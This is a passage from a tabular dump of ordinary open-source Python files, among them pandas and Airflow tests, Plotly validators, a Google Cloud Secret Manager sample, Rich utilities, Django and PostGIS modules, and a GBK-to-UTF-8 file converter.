            ci.append(ci.values.reorder_categories(list(""abc"")))

    def test_append_category_objects(self, ci):
        # with objects
        result = ci.append(Index([""c"", ""a""]))
        expected = CategoricalIndex(list(""aabbcaca""), categories=ci.categories)
        tm.assert_index_equal(result, expected, exact=True)

    def test_append_non_categories(self, ci):
        # invalid objects -> cast to object via concat_compat
        result = ci.append(Index([""a"", ""d""]))
        expected = Index([""a"", ""a"", ""b"", ""b"", ""c"", ""a"", ""a"", ""d""])
        tm.assert_index_equal(result, expected, exact=True)

    def test_append_object(self, ci):
        # GH#14298 - if base object is not categorical -> coerce to object
        result = Index([""c"", ""a""]).append(ci)
        expected = Index(list(""caaabbca""))
        tm.assert_index_equal(result, expected, exact=True)

    def test_append_to_another(self):
        # hits Index._concat
        fst = Index([""a"", ""b""])
        snd = CategoricalIndex([""d"", ""e""])
        result = fst.append(snd)
        expected = Index([""a"", ""b"", ""d"", ""e""])
        tm.assert_index_equal(result, expected)"
JY243	JY243-_outsidetextfont.py	"import _plotly_utils.basevalidators


class OutsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""outsidetextfont"", parent_name=""waterfall"", **kwargs
    ):
        super(OutsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Outsidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD322	JD322-destroy_secret_version.py	"#!/usr/bin/env python

# Copyright 2019 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
""""""
command line application and sample code for destroying a secret version.
""""""

import argparse


# [START secretmanager_destroy_secret_version]
def destroy_secret_version(project_id, secret_id, version_id):
    """"""
    Destroy the given secret version, making the payload irrecoverable. Other
    secrets versions are unaffected.
    """"""

    # Import the Secret Manager client library.
    from google.cloud import secretmanager

    # Create the Secret Manager client.
    client = secretmanager.SecretManagerServiceClient()

    # Build the resource name of the secret version
    name = f""projects/{project_id}/secrets/{secret_id}/versions/{version_id}""

    # Destroy the secret version.
    response = client.destroy_secret_version(request={""name"": name})

    print(""Destroyed secret version: {}"".format(response.name))
    # [END secretmanager_destroy_secret_version]

    return response


if __name__ == ""__main__"":
    parser = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(""project_id"", help=""id of the GCP project"")
    parser.add_argument(""secret_id"", help=""id of the secret from which to act"")
    parser.add_argument(""version_id"", help=""id of the version to destroy"")
    args = parser.parse_args()

    destroy_secret_version(args.project_id, args.secret_id, args.version_id)"
JD50	JD50-_wrap.py	"import re
from typing import Iterable, List, Tuple

from ._loop import loop_last
from .cells import cell_len, chop_cells

re_word = re.compile(r""\s*\S+\s*"")


def words(text: str) -> Iterable[Tuple[int, int, str]]:
    position = 0
    word_match = re_word.match(text, position)
    while word_match is not None:
        start, end = word_match.span()
        word = word_match.group(0)
        yield start, end, word
        word_match = re_word.match(text, end)


def divide_line(text: str, width: int, fold: bool = True) -> List[int]:
    divides: List[int] = []
    append = divides.append
    line_position = 0
    _cell_len = cell_len
    for start, _end, word in words(text):
        word_length = _cell_len(word.rstrip())
        if line_position + word_length > width:
            if word_length > width:
                if fold:
                    chopped_words = chop_cells(word, max_size=width, position=0)
                    for last, line in loop_last(chopped_words):
                        if start:
                            append(start)

                        if last:
                            line_position = _cell_len(line)
                        else:
                            start += len(line)
                else:
                    if start:
                        append(start)
                    line_position = _cell_len(word)
            elif line_position and start:
                append(start)
                line_position = _cell_len(word)
        else:
            line_position += _cell_len(word)
    return divides


if __name__ == ""__main__"":  # pragma: no cover
    from .console import Console

    console = Console(width=10)
    console.print(""12345 abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ 12345"")
    print(chop_cells(""abcdefghijklmnopqrstuvwxyz"", 10, position=2))"
JY213	JY213-nativePipeTestService.py	"# This is an example of a service hosted by python.exe rather than
# pythonservice.exe.

# Note that it is very rare that using python.exe is a better option
# than the default pythonservice.exe - the latter has better error handling
# so that if Python itself can't be initialized or there are very early
# import errors, you will get error details written to the event log.  When
# using python.exe instead, you are forced to wait for the interpreter startup
# and imports to succeed before you are able to effectively setup your own
# error handling.

# So in short, please make sure you *really* want to do this, otherwise just
# stick with the default.

import sys
import os
import win32serviceutil
import servicemanager

from pipeTestService import TestPipeService


class NativeTestPipeService(TestPipeService):
    _svc_name_ = ""PyNativePipeTestService""
    _svc_display_name_ = ""Python Native Pipe Test Service""
    _svc_description_ = ""Tests Python.exe hosted services""
    # tell win32serviceutil we have a custom executable and custom args
    # so registration does the right thing.
    _exe_name_ = sys.executable
    _exe_args_ = '""' + os.path.abspath(sys.argv[0]) + '""'


def main():
    if len(sys.argv) == 1:
        # service must be starting...
        # for the sake of debugging etc, we use win32traceutil to see
        # any unhandled exceptions and print statements.
        import win32traceutil

        print(""service is starting..."")
        print(""(execute this script with '--help' if that isn't what you want)"")

        servicemanager.Initialize()
        servicemanager.PrepareToHostSingle(NativeTestPipeService)
        # Now ask the service manager to fire things up for us...
        servicemanager.StartServiceCtrlDispatcher()
        print(""service done!"")
    else:
        win32serviceutil.HandleCommandLine(NativeTestPipeService)


if __name__ == ""__main__"":
    try:
        main()
    except (SystemExit, KeyboardInterrupt):
        raise
    except:
        print(""Something went bad!"")
        import traceback

        traceback.print_exc()"
JY72	JY72-items.py	"from typing import Optional

from fastapi import Depends, HTTPException, Path, Query
from starlette import status

from app.api.dependencies.authentication import get_current_user_authorizer
from app.api.dependencies.database import get_repository
from app.db.errors import EntityDoesNotExist
from app.db.repositories.items import ItemsRepository
from app.models.domain.items import Item
from app.models.domain.users import User
from app.models.schemas.items import (
    DEFAULT_ITEMS_LIMIT,
    DEFAULT_ITEMS_OFFSET,
    ItemsFilters,
)
from app.resources import strings
from app.services.items import check_user_can_modify_item


def get_items_filters(
    tag: Optional[str] = None,
    seller: Optional[str] = None,
    favorited: Optional[str] = None,
    limit: int = Query(DEFAULT_ITEMS_LIMIT, ge=1),
    offset: int = Query(DEFAULT_ITEMS_OFFSET, ge=0),
) -> ItemsFilters:
    return ItemsFilters(
        tag=tag,
        seller=seller,
        favorited=favorited,
        limit=limit,
        offset=offset,
    )


async def get_item_by_slug_from_path(
    slug: str = Path(..., min_length=1),
    user: Optional[User] = Depends(get_current_user_authorizer(required=False)),
    items_repo: ItemsRepository = Depends(get_repository(ItemsRepository)),
) -> Item:
    try:
        return await items_repo.get_item_by_slug(slug=slug, requested_user=user)
    except EntityDoesNotExist:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail=strings.ITEM_DOES_NOT_EXIST_ERROR,
        )


def check_item_modification_permissions(
    current_item: Item = Depends(get_item_by_slug_from_path),
    user: User = Depends(get_current_user_authorizer()),
) -> None:
    if not check_user_can_modify_item(current_item, user):
        raise HTTPException(
            status_code=status.HTTP_403_FORBIDDEN,
            detail=strings.USER_IS_NOT_SELLER_OF_ITEM,
        )"
JY234	JY234-test_miscellaneous.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Example DAG demonstrating the usage of the BashOperator.""""""
from __future__ import annotations

import datetime

from airflow import DAG
from airflow.operators.bash import BashOperator
from airflow.operators.empty import EmptyOperator

args = {
    ""owner"": ""airflow"",
}

dag = DAG(
    dag_id=""miscellaneous_test_dag"",
    default_args=args,
    schedule=""0 0 * * *"",
    start_date=datetime.datetime(2022, 1, 1),
    dagrun_timeout=datetime.timedelta(minutes=60),
    tags=[""example"", ""example2""],
    params={""example_key"": ""example_value""},
)

run_this_last = EmptyOperator(
    task_id=""run_this_last"",
    dag=dag,
)

# [START howto_operator_bash]
run_this = BashOperator(
    task_id=""run_after_loop"",
    bash_command=""echo 1"",
    dag=dag,
)
# [END howto_operator_bash]

run_this >> run_this_last

for i in range(3):
    task = BashOperator(
        task_id=""runme_"" + str(i),
        bash_command='echo ""{{ task_instance_key_str }}"" && sleep 1',
        dag=dag,
    )
    task >> run_this

# [START howto_operator_bash_template]
also_run_this = BashOperator(
    task_id=""also_run_this"",
    bash_command='echo ""run_id={{ run_id }} | dag_run={{ dag_run }}""',
    dag=dag,
)
# [END howto_operator_bash_template]
also_run_this >> run_this_last

if __name__ == ""__main__"":
    dag.cli()"
JY445	JY445-anim.py	"# -*- coding: utf-8 -*-
# Copyright (C) 2006-2007 Søren Roug, European Environment Agency
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
#
# Contributor(s):
#

from odf.namespaces import ANIMNS
from odf.element import Element


# Autogenerated
def Animate(**args):
    return Element(qname = (ANIMNS,'animate'), **args)

def Animatecolor(**args):
    return Element(qname = (ANIMNS,'animateColor'), **args)

def Animatemotion(**args):
    return Element(qname = (ANIMNS,'animateMotion'), **args)

def Animatetransform(**args):
    return Element(qname = (ANIMNS,'animateTransform'), **args)

def Audio(**args):
    return Element(qname = (ANIMNS,'audio'), **args)

def Command(**args):
    return Element(qname = (ANIMNS,'command'), **args)

def Iterate(**args):
    return Element(qname = (ANIMNS,'iterate'), **args)

def Par(**args):
    return Element(qname = (ANIMNS,'par'), **args)

def Param(**args):
    return Element(qname = (ANIMNS,'param'), **args)

def Seq(**args):
    return Element(qname = (ANIMNS,'seq'), **args)

def Set(**args):
    return Element(qname = (ANIMNS,'set'), **args)

def Transitionfilter(**args):
    return Element(qname = (ANIMNS,'transitionFilter'), **args)
"
JY443	JY443-schema.py	"# Copyright (c) 2020, Oracle and/or its affiliates.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License, version 2.0, as
# published by the Free Software Foundation.
#
# This program is also distributed with certain software (including
# but not limited to OpenSSL) that is licensed under separate terms,
# as designated in a particular file or component or in included license
# documentation.  The authors of MySQL hereby grant you an
# additional permission to link the program and your derivative works
# with the separately licensed software that they have included with
# MySQL.
#
# Without limiting anything contained in the foregoing, this file,
# which is part of MySQL Connector/Python, is also subject to the
# Universal FOSS Exception, version 1.0, a copy of which can be found at
# http://oss.oracle.com/licenses/universal-foss-exception.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
# See the GNU General Public License, version 2.0, for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin St, Fifth Floor, Boston, MA 02110-1301  USA

from django.db.backends.mysql.schema import DatabaseSchemaEditor as MySQLDatabaseSchemaEditor


class DatabaseSchemaEditor(MySQLDatabaseSchemaEditor):

    def quote_value(self, value):
        self.connection.ensure_connection()
        if isinstance(value, str):
            value = value.replace('%', '%%')
        quoted = self.connection.connection.converter.escape(value)
        if isinstance(value, str) and isinstance(quoted, bytes):
            quoted = quoted.decode()
        return quoted"
JY146	JY146-log.py	"""""""A simple log mechanism styled after PEP 282.""""""

# The class here is styled after PEP 282 so that it could later be
# replaced with a standard Python logging implementation.

import sys

DEBUG = 1
INFO = 2
WARN = 3
ERROR = 4
FATAL = 5


class Log:
    def __init__(self, threshold=WARN):
        self.threshold = threshold

    def _log(self, level, msg, args):
        if level not in (DEBUG, INFO, WARN, ERROR, FATAL):
            raise ValueError('%s wrong log level' % str(level))

        if level >= self.threshold:
            if args:
                msg = msg % args
            if level in (WARN, ERROR, FATAL):
                stream = sys.stderr
            else:
                stream = sys.stdout
            try:
                stream.write('%s\n' % msg)
            except UnicodeEncodeError:
                # emulate backslashreplace error handler
                encoding = stream.encoding
                msg = msg.encode(encoding, ""backslashreplace"").decode(encoding)
                stream.write('%s\n' % msg)
            stream.flush()

    def log(self, level, msg, *args):
        self._log(level, msg, args)

    def debug(self, msg, *args):
        self._log(DEBUG, msg, args)

    def info(self, msg, *args):
        self._log(INFO, msg, args)

    def warn(self, msg, *args):
        self._log(WARN, msg, args)

    def error(self, msg, *args):
        self._log(ERROR, msg, args)

    def fatal(self, msg, *args):
        self._log(FATAL, msg, args)


_global_log = Log()
log = _global_log.log
debug = _global_log.debug
info = _global_log.info
warn = _global_log.warn
error = _global_log.error
fatal = _global_log.fatal


def set_threshold(level):
    # return the old threshold for use from tests
    old = _global_log.threshold
    _global_log.threshold = level
    return old


def set_verbosity(v):
    if v <= 0:
        set_threshold(WARN)
    elif v == 1:
        set_threshold(INFO)
    elif v >= 2:
        set_threshold(DEBUG)"
JY419	JY419-_outsidetextfont.py	"import _plotly_utils.basevalidators


class OutsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""outsidetextfont"", parent_name=""bar"", **kwargs):
        super(OutsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Outsidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JD244	JD244-__init__.py	"""""""
An enhanced distutils, providing support for Fortran compilers, for BLAS,
LAPACK and other common libraries for numerical computing, and more.

Public submodules are::

    misc_util
    system_info
    cpu_info
    log
    exec_command

For details, please see the *Packaging* and *NumPy Distutils User Guide*
sections of the NumPy Reference Guide.

For configuring the preference for and location of libraries like BLAS and
LAPACK, and for setting include paths and similar build options, please see
``site.cfg.example`` in the root of the NumPy repository or sdist.

""""""

import warnings

# Must import local ccompiler ASAP in order to get
# customized CCompiler.spawn effective.
from . import ccompiler
from . import unixccompiler

from .npy_pkg_config import *

warnings.warn(""\n\n""
    ""  `numpy.distutils` is deprecated since NumPy 1.23.0, as a result\n""
    ""  of the deprecation of `distutils` itself. It will be removed for\n""
    ""  Python >= 3.12. For older Python versions it will remain present.\n""
    ""  It is recommended to use `setuptools < 60.0` for those Python versions.\n""
    ""  For more details, see:\n""
    ""    https://numpy.org/devdocs/reference/distutils_status_migration.html \n\n"",
    DeprecationWarning, stacklevel=2
)
del warnings

# If numpy is installed, add distutils.test()
try:
    from . import __config__
    # Normally numpy is installed if the above import works, but an interrupted
    # in-place build could also have left a __config__.py.  In that case the
    # next import may still fail, so keep it inside the try block.
    from numpy._pytesttester import PytestTester
    test = PytestTester(__name__)
    del PytestTester
except ImportError:
    pass


def customized_fcompiler(plat=None, compiler=None):
    from numpy.distutils.fcompiler import new_fcompiler
    c = new_fcompiler(plat=plat, compiler=compiler)
    c.customize()
    return c

def customized_ccompiler(plat=None, compiler=None, verbose=1):
    c = ccompiler.new_compiler(plat=plat, compiler=compiler, verbose=verbose)
    c.customize('')
    return c"
JD39	JD39-_export_format.py	"CONSOLE_HTML_FORMAT = """"""\
<!DOCTYPE html>
<head>
<meta charset=""UTF-8"">
<style>
{stylesheet}
body {{
    color: {foreground};
    background-color: {background};
}}
</style>
</head>
<html>
<body>
    <code>
        <pre style=""font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace"">{code}</pre>
    </code>
</body>
</html>
""""""

CONSOLE_SVG_FORMAT = """"""\
<svg class=""rich-terminal"" viewBox=""0 0 {width} {height}"" xmlns=""http://www.w3.org/2000/svg"">
    <!-- Generated with Rich https://www.textualize.io -->
    <style>

    @font-face {{
        font-family: ""Fira Code"";
        src: local(""FiraCode-Regular""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Regular.woff2"") format(""woff2""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Regular.woff"") format(""woff"");
        font-style: normal;
        font-weight: 400;
    }}
    @font-face {{
        font-family: ""Fira Code"";
        src: local(""FiraCode-Bold""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Bold.woff2"") format(""woff2""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Bold.woff"") format(""woff"");
        font-style: bold;
        font-weight: 700;
    }}

    .{unique_id}-matrix {{
        font-family: Fira Code, monospace;
        font-size: {char_height}px;
        line-height: {line_height}px;
        font-variant-east-asian: full-width;
    }}

    .{unique_id}-title {{
        font-size: 18px;
        font-weight: bold;
        font-family: arial;
    }}

    {styles}
    </style>

    <defs>
    <clipPath id=""{unique_id}-clip-terminal"">
      <rect x=""0"" y=""0"" width=""{terminal_width}"" height=""{terminal_height}"" />
    </clipPath>
    {lines}
    </defs>

    {chrome}
    <g transform=""translate({terminal_x}, {terminal_y})"" clip-path=""url(#{unique_id}-clip-terminal)"">
    {backgrounds}
    <g class=""{unique_id}-matrix"">
    {matrix}
    </g>
    </g>
</svg>
""""""

_SVG_FONT_FAMILY = ""Rich Fira Code""
_SVG_CLASSES_PREFIX = ""rich-svg"""
JY494	JY494-_binary.py	"#
# The Python Imaging Library.
# $Id$
#
# Binary input/output support routines.
#
# Copyright (c) 1997-2003 by Secret Labs AB
# Copyright (c) 1995-2003 by Fredrik Lundh
# Copyright (c) 2012 by Brian Crowell
#
# See the README file for information on usage and redistribution.
#


""""""Binary input/output support routines.""""""


from struct import pack, unpack_from


def i8(c):
    return c if c.__class__ is int else c[0]


def o8(i):
    return bytes((i & 255,))


# Input, le = little endian, be = big endian
def i16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<H"", c, o)[0]


def si16le(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<h"", c, o)[0]


def si16be(c, o=0):
    """"""
    Converts a 2-bytes (16 bits) string to a signed integer, big endian.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from("">h"", c, o)[0]


def i32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to an unsigned integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<I"", c, o)[0]


def si32le(c, o=0):
    """"""
    Converts a 4-bytes (32 bits) string to a signed integer.

    :param c: string containing bytes to convert
    :param o: offset of bytes to convert in string
    """"""
    return unpack_from(""<i"", c, o)[0]


def i16be(c, o=0):
    return unpack_from("">H"", c, o)[0]


def i32be(c, o=0):
    return unpack_from("">I"", c, o)[0]


# Output, le = little endian, be = big endian
def o16le(i):
    return pack(""<H"", i)


def o32le(i):
    return pack(""<I"", i)


def o16be(i):
    return pack("">H"", i)


def o32be(i):
    return pack("">I"", i)"
JY87	JY87-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the PostGIS backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class PostGISGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' view from PostGIS. See the PostGIS
    documentation at Ch. 4.3.2.
    """"""
    f_table_catalog = models.CharField(max_length=256)
    f_table_schema = models.CharField(max_length=256)
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    type = models.CharField(max_length=30)

    class Meta:
        app_label = 'gis'
        db_table = 'geometry_columns'
        managed = False

    def __str__(self):
        return '%s.%s - %dD %s field (SRID: %d)' % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return 'f_table_name'

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return 'f_geometry_column'


class PostGISSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from PostGIS. See the PostGIS
    documentation at Ch. 4.2.1.
    """"""
    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    srtext = models.CharField(max_length=2048)
    proj4text = models.CharField(max_length=2048)

    class Meta:
        app_label = 'gis'
        db_table = 'spatial_ref_sys'
        managed = False

    @property
    def wkt(self):
        return self.srtext"
JD118	JD118-formats.py	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = 'j M Y'                   # '25 Oct 2006'
TIME_FORMAT = 'P'                       # '2:30 p.m.'
DATETIME_FORMAT = 'j M Y, P'            # '25 Oct 2006, 2:30 p.m.'
YEAR_MONTH_FORMAT = 'F Y'               # 'October 2006'
MONTH_DAY_FORMAT = 'j F'                # '25 October'
SHORT_DATE_FORMAT = 'd/m/Y'             # '25/10/2006'
SHORT_DATETIME_FORMAT = 'd/m/Y P'       # '25/10/2006 2:30 p.m.'
FIRST_DAY_OF_WEEK = 0                   # Sunday

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%d/%m/%Y', '%d/%m/%y',             # '25/10/2006', '25/10/06'
    # '%b %d %Y', '%b %d, %Y',          # 'Oct 25 2006', 'Oct 25, 2006'
    # '%d %b %Y', '%d %b, %Y',          # '25 Oct 2006', '25 Oct, 2006'
    # '%B %d %Y', '%B %d, %Y',          # 'October 25 2006', 'October 25, 2006'
    # '%d %B %Y', '%d %B, %Y',          # '25 October 2006', '25 October, 2006'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',                # '2006-10-25 14:30:59'
    '%Y-%m-%d %H:%M:%S.%f',             # '2006-10-25 14:30:59.000200'
    '%Y-%m-%d %H:%M',                   # '2006-10-25 14:30'
    '%d/%m/%Y %H:%M:%S',                # '25/10/2006 14:30:59'
    '%d/%m/%Y %H:%M:%S.%f',             # '25/10/2006 14:30:59.000200'
    '%d/%m/%Y %H:%M',                   # '25/10/2006 14:30'
    '%d/%m/%y %H:%M:%S',                # '25/10/06 14:30:59'
    '%d/%m/%y %H:%M:%S.%f',             # '25/10/06 14:30:59.000200'
    '%d/%m/%y %H:%M',                   # '25/10/06 14:30'
]
DECIMAL_SEPARATOR = '.'
THOUSAND_SEPARATOR = ','
NUMBER_GROUPING = 3"
JD287	JD287-gbk2utf8.py	"
# args 0 is inputDir
# args 1 is outputDir

import os
import sys
import codecs


# 递归遍历 inputDir, 对每个文件执行 func
def walkDir(inputDir, func):
	for root, dirs, files in os.walk(inputDir):
		for file in files:
			# 如果是目录，递归遍历
			if os.path.isdir(os.path.join(root, file)):
				walkDir(os.path.join(root, file), func)
			# 如果是文件，执行 func
			else:
				func(os.path.join(root, file))

# 判断文件编码
# def getEncoding(file):
# 	# 读取文件前 1024 字节
# 	data = open(file, 'rb').read(1024)
# 	# 判断文件编码
# 	if data[:3] == codecs.BOM_UTF8:
# 		return 'utf-8-sig'
# 	elif data.startswith(codecs.BOM_UTF32_LE) or data.startswith(codecs.BOM_UTF32_BE):
# 		return 'utf-32'
# 	elif data.startswith(codecs.BOM_UTF16_LE) or data.startswith(codecs.BOM_UTF16_BE):
# 		return 'utf-16'
# 	else:
# 		return 'gbk'

def gbk2utf8(inputUri, outputUri):
	# 如果 inputUri 指向的文件编码已经是 utf-8 编码了，就不用转换了
	# if codecs.open(inputUri, 'r', 'utf-8').readline() == codecs.open(inputUri, 'r', 'gbk').readline():
	# 	return
	print('converting ' + inputUri + ' to ' + outputUri)
	inputFile = codecs.open(inputUri, 'r', 'gbk')
	outputFile = codecs.open(outputUri, 'w', 'utf-8')
	for line in inputFile:
		outputFile.write(line)
	inputFile.close()
	outputFile.close()


def walkFunc(inputUri):
	outputUri = os.path.join(outputDir, inputUri)
	# 创建 outputUri 的目录
	if not os.path.exists(os.path.dirname(outputUri)):
		os.makedirs(os.path.dirname(outputUri))
	# 捕获异常，防止遇到不可读的文件时程序崩溃
	try:
		gbk2utf8(inputUri, outputUri)
	except Exception as e:
		# 尝试用 iconv 转码
		
		print(inputUri + "" err: "" + str(e))

if __name__ == '__main__':
	inputDir = sys.argv[1]
	outputDir = sys.argv[2]
	walkDir(inputDir, walkFunc)"
JD187	JD187-vim.py	"""""""
    pygments.styles.vim
    ~~~~~~~~~~~~~~~~~~~

    A highlighting style for Pygments, inspired by vim.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace, Token


class VimStyle(Style):
    """"""
    Styles somewhat like vim 7.0
    """"""

    background_color = ""#000000""
    highlight_color = ""#222222""

    styles = {
        Token:                     ""#cccccc"",
        Whitespace:                """",
        Comment:                   ""#000080"",
        Comment.Preproc:           """",
        Comment.Special:           ""bold #cd0000"",

        Keyword:                   ""#cdcd00"",
        Keyword.Declaration:       ""#00cd00"",
        Keyword.Namespace:         ""#cd00cd"",
        Keyword.Pseudo:            """",
        Keyword.Type:              ""#00cd00"",

        Operator:                  ""#3399cc"",
        Operator.Word:             ""#cdcd00"",

        Name:                      """",
        Name.Class:                ""#00cdcd"",
        Name.Builtin:              ""#cd00cd"",
        Name.Exception:            ""bold #666699"",
        Name.Variable:             ""#00cdcd"",

        String:                    ""#cd0000"",
        Number:                    ""#cd00cd"",

        Generic.Heading:           ""bold #000080"",
        Generic.Subheading:        ""bold #800080"",
        Generic.Deleted:           ""#cd0000"",
        Generic.Inserted:          ""#00cd00"",
        Generic.Error:             ""#FF0000"",
        Generic.Emph:              ""italic"",
        Generic.Strong:            ""bold"",
        Generic.Prompt:            ""bold #000080"",
        Generic.Output:            ""#888"",
        Generic.Traceback:         ""#04D"",

        Error:                     ""border:#FF0000""
    }"
JY228	JY228-test_dag_processor_command.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

from unittest import mock

import pytest

from airflow.cli import cli_parser
from airflow.cli.commands import dag_processor_command
from airflow.configuration import conf
from tests.test_utils.config import conf_vars


class TestDagProcessorCommand:
    """"""
    Tests the CLI interface and that it correctly calls the DagProcessor
    """"""

    @classmethod
    def setup_class(cls):
        cls.parser = cli_parser.get_parser()

    @conf_vars(
        {
            (""scheduler"", ""standalone_dag_processor""): ""True"",
            (""core"", ""load_examples""): ""False"",
        }
    )
    @mock.patch(""airflow.cli.commands.dag_processor_command.DagProcessorJob"")
    @pytest.mark.skipif(
